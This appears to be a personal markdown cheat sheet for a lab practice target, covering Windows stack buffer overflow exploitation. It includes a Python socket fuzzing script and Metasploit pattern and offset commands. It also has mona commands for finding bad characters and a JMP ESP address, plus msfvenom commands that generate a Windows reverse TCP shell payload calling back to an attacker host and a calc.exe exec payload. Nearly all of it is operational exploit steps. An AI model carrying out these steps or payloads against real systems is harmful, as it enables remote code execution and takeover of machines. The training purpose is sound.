## LOOK AT ~/BOPractice/VulnApp1


### Fuzz to make crash
```
#!/usr/bin/python

import socket

filler = "A" * 6000
#shellcode = "D" * 324
#jump = "\x03\x15\x10\x41"
#jump = "CCCC"
#shellcode = "D" * 360


buff = filler.encode() 
#buff = badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.211.55.3", 7001))
s.send(buff)
s.close()
```

### Create Pattern to find offset
```
msf-pattern_create -l ###
```

### Locate Bytes in EIP 
```
msf-pattern_offset -l 800 -q 42306142
```

### Confirm by adding B's in EIP spot and send

### Find bad chars
Send it to the application

In Immunity Debugger, make mona create a list of badchars :
```
!mona bytearray –cpb “\x00”
```
The console output will tell you where it has been saved.

Compare this file with the stack contents :
```
!mona compare -a ESP -f <file_with_bad_chars>
!mona compare -a [ADDRESS OF SHELLCODE]-f bytearray.txt
```

### Find JMP ESP

Manual method
List modules
```
!mona modules
```

Get jump as assembly
Theres various jumps that will work
https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/

jump (or call) ESP

pop return

push return

jmp [reg + offset]


```
msf-nasm_shell
nasm > jmp esp
```
Locate it with
```
!mona find -s “\xff\xe4” -m “libspp.dll”
```


Auto??
```
!mona jmp -r esp
```
### Put JMP in LITTLE ENDIAN!!

### Test Shellcode with D's

### Replace shellcode

Don't forget nopsled
```
msfvenom -n 24 -p windows/shell_reverse_tcp LHOST=192.168.133.128 LPORT=80 -f python -o shellcode.py -b '\x00'

msfvenom -p windows/exec -b '<badchars>' -f python --var-name shellcode_calc \
CMD=calc.exe EXITFUNC=thread
```
